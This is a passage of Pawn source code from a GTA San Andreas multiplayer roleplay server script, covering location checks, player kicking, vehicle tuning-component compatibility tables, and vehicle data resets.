			IsPlayerInRangeOfPoint( playerid,8.0, -2408.7590,976.0934,45.4175)   ||
		    IsPlayerInRangeOfPoint( playerid,5.0, -2243.9629,-2560.6477,31.8841) ||
		    IsPlayerInRangeOfPoint( playerid,8.0, -1676.6323,414.0262,6.9484)    ||
		    IsPlayerInRangeOfPoint( playerid,6.0, 2202.2349,2474.3494,10.5258)   ||
		    IsPlayerInRangeOfPoint( playerid,10.0, 614.9333,1689.7418,6.6968)    ||
		    IsPlayerInRangeOfPoint( playerid,8.0, -1328.8250,2677.2173,49.7665)  ||
		    IsPlayerInRangeOfPoint( playerid,6.0, 70.3882,1218.6783,18.5165)     ||
		    IsPlayerInRangeOfPoint( playerid,8.0, 2113.7390,920.1079,10.5255)    ||
		    IsPlayerInRangeOfPoint( playerid,6.0, -1327.7218,2678.8723,50.0625)  ||
		    IsPlayerInRangeOfPoint( playerid,6.0, 1488.67, -2400.87, 14.12)      ||
		    IsPlayerInRangeOfPoint( playerid,6.0, 1765.69, -2287.06, 27.29)      ||
		    IsPlayerInRangeOfPoint( playerid,6.0, 1926.9827,-1769.5992,13.5469)  ||
		    IsPlayerInRangeOfPoint( playerid,6.0, 1926.2886,-1776.2615,13.5469)  ||
            IsPlayerInRangeOfPoint( playerid, 6.0, 3621.0857,-1123.0642,10.8579) ||
		 	IsPlayerInRangeOfPoint( playerid,6.0, 3617.9905,-1113.1862,10.8579 ) ) {
		   	return 1;
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
stock Kickovanje( id, reason[] )
{
	SendClientMessage( id, -1, reason );
	SetTimerEx( "KickIgraca", 150, false, "d", id );
	return 1;
}
//==============================================================================
UnLockCar(carid)
{
    new engine, lights, alarm, doors, bonnet, boot, objective;

	GetVehicleParamsEx(carid, engine, lights, alarm, doors, bonnet, boot, objective);
    SetVehicleParamsEx(carid, engine, lights, alarm, 0, bonnet, boot, objective);
}
//==============================================================================
stock IsComponentidCompatible( modelid, componentid ) {
    if( componentid == 1025 || componentid == 1073 || componentid == 1074 || componentid == 1075 || componentid == 1076 ||
		componentid == 1077 || componentid == 1078 || componentid == 1079 || componentid == 1080 || componentid == 1081 ||
        componentid == 1082 || componentid == 1083 || componentid == 1084 || componentid == 1085 || componentid == 1096 ||
        componentid == 1097 || componentid == 1098 || componentid == 1087 || componentid == 1086 ) {
        return componentid;
	}

    switch( modelid ) {
        case 400: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 ) return componentid;
        case 401: if( componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 114 || componentid == 1020 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 402: if( componentid == 1009 || componentid == 1009 || componentid == 1010 ) return componentid;
        case 404: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007) return componentid;
        case 405: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1023 || componentid == 1000) return componentid;
        case 409: if( componentid == 1009 ) return componentid;
        case 410: if( componentid == 1019 || componentid == 1021 || componentid == 1020 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 411: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 412: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 415: if( componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 418: if( componentid == 1020 || componentid == 1021 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016) return componentid;
        case 419: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 420: if( componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1003) return componentid;
        case 421: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1016 || componentid == 1000) return componentid;
        case 422: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007) return componentid;
        case 426: if( componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003) return componentid;
        case 429: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 436: if( componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 438: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 439: if( componentid == 1003 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1013) return componentid;
        case 442: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 445: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 451: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 458: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 466: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 467: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 474: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 475: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 477: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007) return componentid;
        case 478: if( componentid == 1005 || componentid == 1004 || componentid == 1012 || componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 479: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 480: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 489: if( componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016 || componentid == 1000) return componentid;
        case 491: if( componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 492: if( componentid == 1005 || componentid == 1004 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1016 || componentid == 1000) return componentid;
        case 496: if( componentid == 1006 || componentid == 1017 || componentid == 1007 || componentid == 1011 || componentid == 1019 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1003 || componentid == 1002 || componentid == 1142 || componentid == 1143 || componentid == 1020) return componentid;
        case 500: if( componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 506: if( componentid == 1009) return componentid;
        case 507: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 516: if( componentid == 1004 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1015 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007) return componentid;
        case 517: if( componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 518: if( componentid == 1005 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 526: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 527: if( componentid == 1021 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1015 || componentid == 1017 || componentid == 1007) return componentid;
        case 529: if( componentid == 1012 || componentid == 1011 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 533: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 534: if( componentid == 1126 || componentid == 1127 || componentid == 1179 || componentid == 1185 || componentid == 1100 || componentid == 1123 || componentid == 1125 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1180 || componentid == 1178 || componentid == 1101 || componentid == 1122 || componentid == 1124 || componentid == 1106) return componentid;
        case 535: if( componentid == 1109 || componentid == 1110 || componentid == 1113 || componentid == 1114 || componentid == 1115 || componentid == 1116 || componentid == 1117 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1120 || componentid == 1118 || componentid == 1121 || componentid == 1119) return componentid;
        case 536: if( componentid == 1104 || componentid == 1105 || componentid == 1182 || componentid == 1181 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1184 || componentid == 1183 || componentid == 1128 || componentid == 1103 || componentid == 1107 || componentid == 1108) return componentid;
        case 540: if( componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
        case 541: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 542: if( componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1015) return componentid;
        case 545: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 546: if( componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
        case 547: if( componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1016 || componentid == 1003 || componentid == 1000) return componentid;
        case 549: if( componentid == 1012 || componentid == 1011 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 550: if( componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003) return componentid;
        case 551: if( componentid == 1005 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003) return componentid;
        case 555: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 558: if( componentid == 1092 || componentid == 1089 || componentid == 1166 || componentid == 1165 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1168 || componentid == 1167 || componentid == 1088 || componentid == 1091 || componentid == 1164 || componentid == 1163 || componentid == 1094 || componentid == 1090 || componentid == 1095 || componentid == 1093) return componentid;
        case 559: if( componentid == 1065 || componentid == 1066 || componentid == 1160 || componentid == 1173 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1159 || componentid == 1161 || componentid == 1162 || componentid == 1158 || componentid == 1067 || componentid == 1068 || componentid == 1071 || componentid == 1069 || componentid == 1072 || componentid == 1070 || componentid == 1009) return componentid;
        case 560: if( componentid == 1028 || componentid == 1029 || componentid == 1169 || componentid == 1170 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1141 || componentid == 1140 || componentid == 1032 || componentid == 1033 || componentid == 1138 || componentid == 1139 || componentid == 1027 || componentid == 1026 || componentid == 1030 || componentid == 1031) return componentid;
        case 561: if( componentid == 1064 || componentid == 1059 || componentid == 1155 || componentid == 1157 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1154 || componentid == 1156 || componentid == 1055 || componentid == 1061 || componentid == 1058 || componentid == 1060 || componentid == 1062 || componentid == 1056 || componentid == 1063 || componentid == 1057) return componentid;
        case 562: if( componentid == 1034 || componentid == 1037 || componentid == 1171 || componentid == 1172 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1149 || componentid == 1148 || componentid == 1038 || componentid == 1035 || componentid == 1147 || componentid == 1146 || componentid == 1040 || componentid == 1036 || componentid == 1041 || componentid == 1039) return componentid;
        case 565: if( componentid == 1046 || componentid == 1045 || componentid == 1153 || componentid == 1152 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1150 || componentid == 1151 || componentid == 1054 || componentid == 1053 || componentid == 1049 || componentid == 1050 || componentid == 1051 || componentid == 1047 || componentid == 1052 || componentid == 1048) return componentid;
        case 566: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 567: if( componentid == 1129 || componentid == 1132 || componentid == 1189 || componentid == 1188 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1187 || componentid == 1186 || componentid == 1130 || componentid == 1131 || componentid == 1102 || componentid == 1133) return componentid;
        case 575: if( componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042) return componentid;
        case 576: if( componentid == 1136 || componentid == 1135 || componentid == 1191 || componentid == 1190 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1192 || componentid == 1193 || componentid == 1137 || componentid == 1134) return componentid;
        case 579: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 580: if( componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
        case 585: if( componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007) return componentid;
        case 587: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 589: if( componentid == 1005 || componentid == 1004 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1024 || componentid == 1013 || componentid == 1006 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007) return componentid;
        case 600: if( componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1022 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007) return componentid;
        case 602: if( componentid == 1008 || componentid == 1009 || componentid == 1010) return componentid;
        case 603: if( componentid == 1144 || componentid == 1145 || componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007) return componentid;
    }
    return false;
}
//==============================================================================
stock GetVehicleCameraPos( vehicleid, &Float:x, &Float:y, &Float:z, Float:xoff=0.0, Float:yoff=0.0, Float:zoff=0.0 ) { // credits Pasha
    new Float:rot;
    GetVehicleZAngle( vehicleid, rot );
    rot = 360 - rot;
    GetVehiclePos( vehicleid, x, y, z );
    x = floatsin( rot, degrees ) * yoff + floatcos( rot, degrees ) * xoff + x;
    y = floatcos( rot, degrees ) * yoff - floatsin( rot, degrees ) * xoff + y;
    z = zoff + z;
}
//==============================================================================
SavePlayerVehicleTuning(autoid, componentid) {
 	if( IsASpoiler( componentid ) )
 	    VehicleInfo[ autoid ][ vSpoiler] = componentid;

	else if( IsANitro( componentid ) )
        VehicleInfo[ autoid ][ vNitro] = componentid;

	else if( IsAFrontBumper( componentid ) )
	    VehicleInfo[ autoid ][ vFrontBumper] = componentid;

	else if( IsARearBumper( componentid ) )
	    VehicleInfo[ autoid ][ vRearBumper] = componentid;

	else if( IsAStereo( componentid ) )
	    VehicleInfo[ autoid ][ vStereo] = componentid;

	else if( IsAExhaust( componentid ) )
	    VehicleInfo[ autoid ][ vExhaust] = componentid;

	else if( IsALamp( componentid ) )
	    VehicleInfo[ autoid ][ vLamps] = componentid;

   	else if( IsAHydraulic( componentid ) )
   		VehicleInfo[ autoid ][ vHydraulics ] = componentid;

    else if( IsAVents( componentid ) )
	    VehicleInfo[ autoid ][ vVents ] = componentid;

    else if( IsAHood( componentid ) )
	    VehicleInfo[ autoid ][ vHood ] = componentid;

	else if( IsAWheel( componentid ) )
	    VehicleInfo[ autoid ][ vWheels ] = componentid;

	else if( IsARoof( componentid ) )
	    VehicleInfo[ autoid ][ vRoof ] = componentid;

	else if( IsASkirt( componentid ) )
        VehicleInfo[ autoid ][ vSkirt ] = componentid;

	SaveVehicle( autoid );
}
//==============================================================================
IsASkirt( componentid ) {
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_SIDESKIRT )
	    return true;

	return false;
}
//==============================================================================
IsASpoiler( componentid ) {

	if( GetVehicleComponentType( componentid ) == CARMODTYPE_SPOILER )
	    return true;

	return false;
}
//==============================================================================
IsANitro( componentid ) {
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_NITRO )
	    return true;

	return false;
}
//==============================================================================
IsAFrontBumper( componentid ) {
    if( GetVehicleComponentType( componentid ) == CARMODTYPE_FRONT_BUMPER )
	    return true;

	return false;
}
//==============================================================================
IsARearBumper( componentid ) {
    if( GetVehicleComponentType( componentid ) == CARMODTYPE_REAR_BUMPER )
	    return true;

	return false;
}
//==============================================================================
IsAStereo( componentid ) {
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_STEREO )
	    return true;

	return false;
}
//==============================================================================
IsAExhaust( componentid ) {
    if( GetVehicleComponentType( componentid ) == CARMODTYPE_EXHAUST )
	    return true;

	return false;
}
//==============================================================================
IsALamp( componentid ) {
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_LAMPS )
	    return true;

	return false;
}
//==============================================================================
IsAHydraulic( componentid ) {
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_HYDRAULICS )
	    return true;

	return false;
}
//==============================================================================
IsAVents( componentid ) {
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_VENT_RIGHT || GetVehicleComponentType( componentid ) == CARMODTYPE_VENT_LEFT )
	    return true;

	return false;
}
//==============================================================================
IsAHood( componentid ) {
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_HOOD )
	    return true;

	return false;
}
//==============================================================================
IsAWheel( componentid ) {
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_WHEELS )
	    return true;

	return false;
}
//==============================================================================
IsARoof( componentid ) {
	if( GetVehicleComponentType( componentid ) == CARMODTYPE_ROOF )
	    return true;

	return false;
}
//==============================================================================
TuneVehicle( vehicleid ) {
	if( vehicleid != -1 ) {
		if( VehicleInfo[ vehicleid ][ vTuned ] != 0) {
			if( VehicleInfo[ vehicleid ][ vPaintJob ] >= 0 && VehicleInfo[ vehicleid ][ vPaintJob ] < 6)
		        ChangeVehiclePaintjob( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vPaintJob ] );
		 	if( IsASpoiler( VehicleInfo[ vehicleid ][ vSpoiler ] ) )
		        AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vSpoiler ] );
			if( IsANitro( VehicleInfo[ vehicleid ][ vNitro ] ) )
		        AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vNitro ] );
			if( IsAFrontBumper( VehicleInfo[ vehicleid ][ vFrontBumper ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vFrontBumper ] );
			if( IsARearBumper( VehicleInfo[ vehicleid ][ vRearBumper ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vRearBumper ] );
			if( IsAStereo( VehicleInfo[ vehicleid ][ vStereo ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vStereo ] );
			if( IsAExhaust( VehicleInfo[ vehicleid ][ vExhaust ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vExhaust ] );
			if( IsALamp( VehicleInfo[ vehicleid ][ vLamps ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vLamps ] );
		    if( IsAHydraulic( VehicleInfo[ vehicleid ][ vHydraulics ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vHydraulics ] );
		    if( IsAVents( VehicleInfo[ vehicleid ][ vVents ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vVents ] );
		    if( IsAHood( VehicleInfo[ vehicleid ][ vHood ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vHood ] );
			if( IsAWheel( VehicleInfo[ vehicleid ][ vWheels ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vWheels ] );
			if( IsARoof( VehicleInfo[ vehicleid ][ vRoof ] ) )
			    AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vRoof ] );
			if( IsASkirt( VehicleInfo[ vehicleid ][ vSkirt ] ) )
		        AddVehicleComponent( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vSkirt ] );

	        ChangeVehicleColor( VehicleInfo[ vehicleid ][ vID ], VehicleInfo[ vehicleid ][ vColor1 ], VehicleInfo[ vehicleid ][ vColor2 ] );
	  	}
	}
}
//------------------------------------------------------------------------------
IsPlayerNearPlayer(Float:radi, playerid, targetid)
{
    if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) ) {
	    if( GetPlayerVirtualWorld( playerid ) == GetPlayerVirtualWorld( targetid ) ) {

			new Float:posx,
			    Float:posy,
				Float:posz,
			    Float:oldposx,
				Float:oldposy,
				Float:oldposz,
			    Float:tempposx,
				Float:tempposy,
				Float:tempposz;

			GetPlayerPos( playerid, oldposx, oldposy, oldposz);

			GetPlayerPos(targetid, posx, posy, posz);
			tempposx = (oldposx -posx);
			tempposy = (oldposy -posy);
			tempposz = (oldposz -posz);

			if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
			{
				return 1;
			}
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
stock ResetVehicleStatistics( i ) {
    if( i != INVALID_VEHICLE_ID ) {
	    truckerVehicle[ i ][ tID ][ 0 ] = 0;
		truckerVehicle[ i ][ tID ][ 1 ] = 0;
		truckerVehicle[ i ][ tID ][ 2 ] = 0;
		truckerVehicle[ i ][ tID ][ 3 ] = 0;
		truckerVehicle[ i ][ tID ][ 4 ] = 0;
		truckerVehicle[ i ][ tID ][ 5 ] = 0;
		truckerVehicle[ i ][ tID ][ 6 ] = 0;
		truckerVehicle[ i ][ tID ][ 7 ] = 0;
		truckerVehicle[ i ][ tID ][ 8 ] = 0;
		truckerVehicle[ i ][ tID ][ 9 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 0 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 1 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 2 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 3 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 4 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 5 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 6 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 7 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 8 ] = 0;
		truckerVehicle[ i ][ tCargoPlaced ][ 9 ] = 0;
		pizzaVehicle[ i ] = false;
		garbagemanVehicles[ i ][ gGarbages ] = 0;
		garbagemanVehicles[ i ][ gPlayerID ] = -1;
		farmerVehicles[ i ][ fvSeeds ] = 0;
		farmerVehicles[ i ][ fvMilk ] = false;
		farmerVehicles[ i ][ fvMilkpID ] = -1;
		sljunak[ i ] = false;
		VehCement[ i ] = false;
		BusyVehicle[ i ] = -1;
	}
}
stock ResetVehicle( i ) {
	VehicleInfo[ i ][ vOwned ] = 0;
    VehicleInfo[ i ][ vPrice ] = 0;
	strmid( VehicleInfo[ i ][ vOwner ], "Drzava", 0, strlen("Drzava"), 32);
    VehicleInfo[ i ][ vLocked ] = 0;
    VehicleInfo[ i ][ vLokacijaX ] = 0;
    VehicleInfo[ i ][ vLokacijaY ] = 0;
    VehicleInfo[ i ][ vLokacijaZ ] = 0;
    VehicleInfo[ i ][ vLokacijaA ] = 0;
    VehicleInfo[ i ][ vVirtualWorld ] = 0;
	VehicleInfo[ i ][ vInterior ] = 0;
    VehicleInfo[ i ][ vUsage ] = 0;
    VehicleInfo[ i ][ vJob ] = 0;
    VehicleInfo[ i ][ vOrganization ] = 0;
    VehicleInfo[ i ][ vColor1 ] = 0;
    VehicleInfo[ i ][ vColor2 ] = 0;
    VehicleInfo[ i ][ vModel ] = 0;
    VehicleInfo[ i ][ vReg ] = 0;
    VehicleInfo[ i ][ vTeh ] = 0;
    VehicleInfo[ i ][ vGPS ] = 0;
    VehicleInfo[ i ][ vOsiguranje ] = 0;
    VehicleInfo[ i ][ vLock ] = 0;
    VehicleInfo[ i ][ vAlarm ] = 0;
    VehicleInfo[ i ][ vFuel ] = 100;
    VehicleInfo[ i ][ vNeon ] = 0;
    VehicleInfo[ i ][ vTuned ] = 0;
    VehicleInfo[ i ][ vImobilizator ] = 0;
    VehicleInfo[ i ][ vSpoiler ] = 0;
    VehicleInfo[ i ][ vHood ] = 0;
    VehicleInfo[ i ][ vRoof ] = 0;
    VehicleInfo[ i ][ vSkirt ] = 0;
    VehicleInfo[ i ][ vLamps ] = 0;
    VehicleInfo[ i ][ vNitro ] = 0;
    VehicleInfo[ i ][ vExhaust ] = 0;
    VehicleInfo[ i ][ vWheels ] = 0;
    VehicleInfo[ i ][ vStereo ] = 0;
    VehicleInfo[ i ][ vHydraulics ] = 0;
    VehicleInfo[ i ][ vFrontBumper ] = 0;
    VehicleInfo[ i ][ vRearBumper ] = 0;
    VehicleInfo[ i ][ vVents ] = 0;
    VehicleInfo[ i ][ vPaintJob ] = 255;
    VehicleInfo[ i ][ vProvera ] = -1;
    VehicleInfo[ i ][ vDrug ][ 0 ] = 0;
	VehicleInfo[ i ][ vDrug ][ 1 ] = 0;
	VehicleInfo[ i ][ vDrug ][ 2 ] = 0;
	VehicleInfo[ i ][ vDrug ][ 3 ] = 0;
	VehicleInfo[ i ][ vDrug ][ 4 ] = 0;
	VehicleInfo[ i ][ vDrug ][ 5 ] = 0;
	VehicleInfo[ i ][ vDrugCode ][ 0 ] = 0;
	VehicleInfo[ i ][ vDrugCode ][ 1 ] = 0;
	VehicleInfo[ i ][ vDrugCode ][ 2 ] = 0;
	VehicleInfo[ i ][ vDrugCode ][ 3 ] = 0;
	VehicleInfo[ i ][ vDrugCode ][ 4 ] = 0;
	VehicleInfo[ i ][ vDrugCode ][ 5 ] = 0;
